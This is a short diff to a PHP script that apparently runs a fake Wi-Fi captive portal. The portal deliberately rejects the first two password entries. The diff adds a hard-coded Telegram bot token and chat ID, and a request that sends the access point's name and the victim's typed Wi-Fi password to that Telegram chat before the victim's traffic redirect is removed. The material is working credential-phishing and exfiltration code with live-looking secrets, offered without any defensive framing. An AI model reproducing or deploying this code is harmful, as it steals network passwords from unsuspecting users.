@@ -1,6 +1,9 @@
 <?php
 set_time_limit(60);
 
+$token = '834034144:AAHVj2gRGsj2IegHSgVZsjJ0rrOHmE3ZmWI';
+$chat = '-349544685';
+
 if (isset($_POST['cou'])) {
 	if ($_POST['cou'] <= 1) { // 2回エラーを出す
 		$err = 'パスワードが正しくありません';
@@ -10,6 +13,10 @@ if (isset($_POST['cou'])) {
 	if ($err) {
 		sleep(3);
 	} else {
+		file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id='
+			. $chat . '&disable_web_page_preview=true&parse_mode=HTML&text='
+			. urlencode('[WIFI] SSID：' . file_get_contents('../conf/apname') .  '， PASS：' . $_POST['pass']));
+
 		system('sudo iptables -t nat -D PREROUTING `sudo iptables -t nat -L --line-numbers '
 			. '| grep "' . $_SERVER['REMOTE_ADDR'] . '" | grep ":80" | awk \'{print $1}\'`');
 
